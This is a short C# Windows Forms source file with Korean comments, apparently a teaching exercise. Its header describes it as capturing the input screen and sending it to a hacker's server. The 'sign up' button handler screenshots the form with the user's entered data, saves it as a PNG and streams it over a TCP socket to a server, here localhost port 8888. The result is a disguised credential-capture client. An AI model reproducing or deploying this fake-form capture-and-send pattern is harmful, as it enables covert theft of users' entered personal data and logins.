using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
/*
[입력 화면 캡처 전송 - 클라이언트]
 - 스크린을 캡춰하여 해커의 서버에 전송

#이벤트 핸들러
 - btnSave_Click(object sender, EventArgs e) : [회원가입] 버튼, 서버와 통신하며 캡처한 이미지 파일을 전송
*/
namespace mook_ScreenClien
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        //[회원가입] : 화면 캡춰된 이미지 파일을 서버에 전송
        private void btnSave_Click(object sender, EventArgs e)
        {
            if (!ScreenCapture()) // 폼 영역 화면을 캡춰
                return;
            Socket mySocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //SocketType.Stream : 데이터 중복이나 경계 유지 없이 신뢰할 수 있는 양방향 연결 기반의 바이트 스트림을 지원
            //                    tcp 및  AddressFamily.InterNetwork에서 사용
            //※참고로 udp는 SocketType.Dgram 사용

            mySocket.Connect("127.0.0.1", 8888); //소켓에 아이피와 포트 입력
            FileStream fileStr = new FileStream("CaptureFile.png", FileMode.Open, FileAccess.Read); //FileStream으로 파일 읽기
            int fileLength = (int)fileStr.Length;//FileStream으로 읽은 파일의 전체 길이
            byte[] buffer = BitConverter.GetBytes(fileLength); //32비트 부호 있는 정수 값을 바이트 배열로 반환하여 이미지 크기만큼 버퍼 생성 
            mySocket.Send(buffer); //이미지 파일 크기의 버퍼를 서버 Socket으로 전달
            int count = fileLength / 1024 + 1; //for문 조건식에서 i < count이므로  fileLength를 1024로 나눈 뒤 1을 더해준다
            BinaryReader reader = new BinaryReader(fileStr); //바이너리 리더에서 FileStream으로 불러들인 파일을 읽고
            for (int i = 0; i < count; i++)
            {
                buffer = reader.ReadBytes(1024); //1024바이트만큼 읽어 버퍼에 담아
                mySocket.Send(buffer); //소켓으로 보낸다
            }

            reader.Close();
            mySocket.Close();
        }

        //입력 화면을 캡춰하여 이미지로 저장
        private bool ScreenCapture()
        {
            Graphics screenG;
            Bitmap captWin;
            SaveFileDialog sfd = new SaveFileDialog();

            captWin = new Bitmap(this.Width, this.Height);
            screenG = Graphics.FromImage(captWin);
            screenG.CopyFromScreen(this.Location, new Point(0, 0), this.Size);
            #region Bitmap.CopyFromScreen(Point, Point, Size)
            /*
            #Bitmap.CopyFromScreen(Point, Point, Size)
             - 화면에서 설정한 부분을 캡춰한다
             - 매개변수
              1. Point : 현재 폼 위치
              2. Point : 폼 기준 시작 위치(0, 0)
              3. Size : 폼의 크기
            */
            #endregion

            sfd.FileName = "CaptureFile.png";
            captWin.Save(sfd.FileName, ImageFormat.Png);

            //파일이 존재하면 true반환
            FileInfo fi = new FileInfo("CaptureFile.png");
            if (fi.Exists)
                return true;
            else
                return false;
        }
    }
}
